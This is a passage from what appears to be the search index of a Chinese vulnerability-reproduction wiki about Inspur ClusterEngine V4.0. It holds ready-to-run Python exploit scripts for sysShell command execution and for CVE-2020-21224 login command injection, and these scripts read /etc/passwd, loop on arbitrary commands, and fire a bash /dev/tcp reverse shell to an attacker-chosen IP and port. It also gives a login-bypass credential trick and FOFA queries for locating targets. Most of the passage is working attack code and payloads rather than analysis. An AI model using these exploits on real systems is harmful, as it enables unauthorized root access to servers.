\u8fd9\u91cc\u53ef\u4ee5\u914d\u5408\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e\u67e5\u770b\u4e3b\u673a\u540d","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528","text":"[!NOTE] \u5982\u8fc7\u51fa\u73b0 Name or service not \u8bf7\u901a\u8fc7\u4e0a\u8ff0\u7684\u65b9\u6cd5\u67e5\u770b shell\u96c6\u7fa4\u4e3b\u673a\u7684\u540d\u79f0\uff08\u811a\u672c\u9ed8\u8ba4 cu01\uff09 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: SonicWall SSL-VPN \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , cmd ): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded; charset=UTF-8\" , \"Cookie\" : \"lang=cn\" } data = \"op=doPlease&node=cu01&command=cat /etc/passwd\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /sysShell \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u6267\u884c cat /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded; charset=UTF-8\" , \"Cookie\" : \"lang=cn\" } data = \"op=doPlease&node=cu01&command= {} \" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () cmd = 'cat /etc/passwd' target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , cmd )","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] ClusterEngine V4.0 Shell cluster RCE","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u6d6a\u6f6eClusterEngineV4.0 \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6d6a\u6f6eClusterEngineV4.0 \u5b58\u5728\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e\uff0c\u6784\u9020\u6076\u610f\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u5373\u53ef\u83b7\u53d6\u540e\u53f0\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6d6a\u6f6eClusterEngineV4.0 FOFA \u00b6 [!NOTE] title=\"TSCEV4.0\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b USER\uff1a admin|pwd PASS: \u4efb\u610f \u6210\u529f\u767b\u9646\u540e\u53f0 [!NOTE] \u90e8\u5206\u529f\u80fd\u662f\u65e0\u6cd5\u4f7f\u7528\u7684","title":"\u6d6a\u6f6eClusterEngineV4.0 \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6d6a\u6f6eclusterenginev40-\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e","text":"","title":"\u6d6a\u6f6eClusterEngineV4.0 \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6d6a\u6f6eClusterEngineV4.0 \u5b58\u5728\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e\uff0c\u6784\u9020\u6076\u610f\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u5373\u53ef\u83b7\u53d6\u540e\u53f0\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6d6a\u6f6eClusterEngineV4.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"TSCEV4.0\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b USER\uff1a admin|pwd PASS: \u4efb\u610f \u6210\u529f\u767b\u9646\u540e\u53f0 [!NOTE] \u90e8\u5206\u529f\u80fd\u662f\u65e0\u6cd5\u4f7f\u7528\u7684","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/","text":"\u6d6a\u6f6eClusterEngineV4.0 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-21224 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6d6a\u6f6e\u670d\u52a1\u5668\u7fa4\u96c6\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u5371\u9669\u5b57\u7b26\u672a\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6d6a\u6f6eClusterEngineV4.0 FOFA \u00b6 [!NOTE] title=\"TSCEV4.0\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u7531\u4e8e\u767b\u5f55\u9875\u9762\u6ca1\u6709\u53d1\u73b0\u9a8c\u8bc1\u7801\uff0c\u8fdb\u884c\u8d26\u53f7\u7206\u7834 \u5f53burpsuite\u7206\u7834\u5b8c\u6210\u65f6\uff0c\u6ce8\u610f\u5230POST\u6570\u636e\u4e2d\u5982\u679c\u5e26\u6709 ;' \uff0c\u54cd\u5e94\u6570\u636e\u5305\u53d1\u751f\u5f02\u5e38\u3002 \u901a\u8fc7\u54cd\u5e94\u5305\u4fe1\u606f\uff0c\u731c\u6d4b\u53ef\u80fd\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u5e76\u5c06\u6b64\u6570\u636e\u5305\u653e\u5728repeater\u4e2d\uff0c\u6211\u53d1\u73b0\u5982\u679c\u53d1\u5e03\u6570\u636e\u4e2d\u6709 \u4e00\u4e2a ' \uff0c\u7cfb\u7edf\u5c06\u629b\u51fa\u5f02\u5e38\u3002 \u8fdb\u4e00\u6b65\u6d4b\u8bd5\u65f6\uff0c\u6211\u53d1\u73b0username\u53c2\u6570\u6216password\u4efb\u4e00\u53c2\u6570\u5982\u679c\u5305\u542b ' \uff0c\u5c06\u5f15\u53d1\u6b64\u5f02\u5e38 \u5b9a\u5c1d\u8bd5\u53d1\u9001 ' ' \u6765\u67e5\u770b\u54cd\u5e94\u5305\u3002 \u6211\u6ce8\u610f\u5230 grep \u547d\u4ee4\u9519\u8bef\uff0c\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u53ef\u80fd\u662f\u8fd9\u6837 var1 = ` grep xxxx ` var2 = $( python -c \"from crypt import crypt;print crypt(' $username ',' $1$$ var1')\" ) \u5c1d\u8bd5\u53d1\u9001 -V \u548c --help \u6765\u67e5\u770b\u54cd\u5e94\u5305\uff0c\u54cd\u5e94\u5305\u8bc1\u5b9e\u4e86\u731c\u6d4b \u5c1d\u8bd5\u8bfb\u53d6 /etc/passswd \u5c1d\u8bd5\u5217\u76ee\u5f55 \u786e\u8ba4\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7ecf\u8fc7fuzz\uff0c\u5f97\u5230\u4ee5\u4e0bpayload \u53cd\u5f39 shell op = login & username = 1 2 \\' , \\' 1 \\'\\) ; ` bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261 ` payload\u53d1\u9001\u540e, \u5728 kali linux \u670d\u52a1\u5668\u4e0a\u83b7\u53d6\u4e86\u4e00\u4e2a root \u6743\u9650\u7684 shell \u4e0a\u9762\u662f\u539f\u6587\u7684\u6d4b\u8bd5\u601d\u8def\uff0c\u4f46\u7ecf\u8fc7\u91cd\u65b0\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u8fd8\u6709\u53e6\u4e00\u79cd\u7b80\u5355\u65b9\u6cd5 POC\u6d4b\u8bd5(\u51fa\u73b0 root:x:0:0 \u5219\u5b58\u5728\u6f0f\u6d1e) op=login&username=peiqi`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user peiqi does not exist\\nerror:1\\n\"} \u53cd\u5f39shell op=login&username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)` \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u6d6a\u6f6eClusterEngineV4.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mIP >>> xxx.xxx.xxx.xxx:9999 \\033 [0m' ) print ( '+ \\033 [36mPORT >>> 9999 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/login\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\" , } data = \"op=login&username=peiqi`$(cat /etc/passwd)`\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 4 ) etc_passwd = re . findall ( r '\\{\"err\":\"/bin/sh: (.*?): No such' , response . text ) if response . status_code == 200 and \"root:x:0:0\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e, \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , etc_passwd [ 0 ])) POC_2 ( target_url ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def POC_2 ( target_url ): IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) vuln_url = target_url + \"/login\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\" , } data = \"op=login&username=`bash%20-i %20% 3E %26% 20 %2F dev %2F tcp %2F{}%2F{}%200% 3E%261`\" . format ( IP , PORT ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!ONTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d ClusterEngineV4.0_RCE \u53c2\u8003\u6587\u7ae0 \u00b6 https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul","title":"\u6d6a\u6f6eClusterEngineV4.0 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-21224"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#\u6d6a\u6f6eclusterenginev40-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-cve-2020-21224","text":"","title":"\u6d6a\u6f6eClusterEngineV4.0 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-21224"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6d6a\u6f6e\u670d\u52a1\u5668\u7fa4\u96c6\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u5371\u9669\u5b57\u7b26\u672a\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6d6a\u6f6eClusterEngineV4.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#fofa","text":"[!NOTE] title=\"TSCEV4.0\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u7531\u4e8e\u767b\u5f55\u9875\u9762\u6ca1\u6709\u53d1\u73b0\u9a8c\u8bc1\u7801\uff0c\u8fdb\u884c\u8d26\u53f7\u7206\u7834 \u5f53burpsuite\u7206\u7834\u5b8c\u6210\u65f6\uff0c\u6ce8\u610f\u5230POST\u6570\u636e\u4e2d\u5982\u679c\u5e26\u6709 ;' \uff0c\u54cd\u5e94\u6570\u636e\u5305\u53d1\u751f\u5f02\u5e38\u3002 \u901a\u8fc7\u54cd\u5e94\u5305\u4fe1\u606f\uff0c\u731c\u6d4b\u53ef\u80fd\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u5e76\u5c06\u6b64\u6570\u636e\u5305\u653e\u5728repeater\u4e2d\uff0c\u6211\u53d1\u73b0\u5982\u679c\u53d1\u5e03\u6570\u636e\u4e2d\u6709 \u4e00\u4e2a ' \uff0c\u7cfb\u7edf\u5c06\u629b\u51fa\u5f02\u5e38\u3002 \u8fdb\u4e00\u6b65\u6d4b\u8bd5\u65f6\uff0c\u6211\u53d1\u73b0username\u53c2\u6570\u6216password\u4efb\u4e00\u53c2\u6570\u5982\u679c\u5305\u542b ' \uff0c\u5c06\u5f15\u53d1\u6b64\u5f02\u5e38 \u5b9a\u5c1d\u8bd5\u53d1\u9001 ' ' \u6765\u67e5\u770b\u54cd\u5e94\u5305\u3002 \u6211\u6ce8\u610f\u5230 grep \u547d\u4ee4\u9519\u8bef\uff0c\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u53ef\u80fd\u662f\u8fd9\u6837 var1 = ` grep xxxx ` var2 = $( python -c \"from crypt import crypt;print crypt(' $username ',' $1$$ var1')\" ) \u5c1d\u8bd5\u53d1\u9001 -V \u548c --help \u6765\u67e5\u770b\u54cd\u5e94\u5305\uff0c\u54cd\u5e94\u5305\u8bc1\u5b9e\u4e86\u731c\u6d4b \u5c1d\u8bd5\u8bfb\u53d6 /etc/passswd \u5c1d\u8bd5\u5217\u76ee\u5f55 \u786e\u8ba4\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7ecf\u8fc7fuzz\uff0c\u5f97\u5230\u4ee5\u4e0bpayload \u53cd\u5f39 shell op = login & username = 1 2 \\' , \\' 1 \\'\\) ; ` bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261 ` payload\u53d1\u9001\u540e, \u5728 kali linux \u670d\u52a1\u5668\u4e0a\u83b7\u53d6\u4e86\u4e00\u4e2a root \u6743\u9650\u7684 shell \u4e0a\u9762\u662f\u539f\u6587\u7684\u6d4b\u8bd5\u601d\u8def\uff0c\u4f46\u7ecf\u8fc7\u91cd\u65b0\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u8fd8\u6709\u53e6\u4e00\u79cd\u7b80\u5355\u65b9\u6cd5 POC\u6d4b\u8bd5(\u51fa\u73b0 root:x:0:0 \u5219\u5b58\u5728\u6f0f\u6d1e) op=login&username=peiqi`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user peiqi does not exist\\nerror:1\\n\"} \u53cd\u5f39shell op=login&username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u6d6a\u6f6eClusterEngineV4.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mIP >>> xxx.xxx.xxx.xxx:9999 \\033 [0m' ) print ( '+ \\033 [36mPORT >>> 9999 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/login\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\" , } data = \"op=login&username=peiqi`$(cat /etc/passwd)`\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 4 ) etc_passwd = re . findall ( r '\\{\"err\":\"/bin/sh: (.*?): No such' , response . text ) if response . status_code == 200 and \"root:x:0:0\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e, \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , etc_passwd [ 0 ])) POC_2 ( target_url ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def POC_2 ( target_url ): IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) vuln_url = target_url + \"/login\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\" , } data = \"op=login&username=`bash%20-i %20% 3E %26% 20 %2F dev %2F tcp %2F{}%2F{}%200% 3E%261`\" . format ( IP , PORT ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#goby--poc","text":"[!ONTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d ClusterEngineV4.0_RCE","title":"Goby &amp; 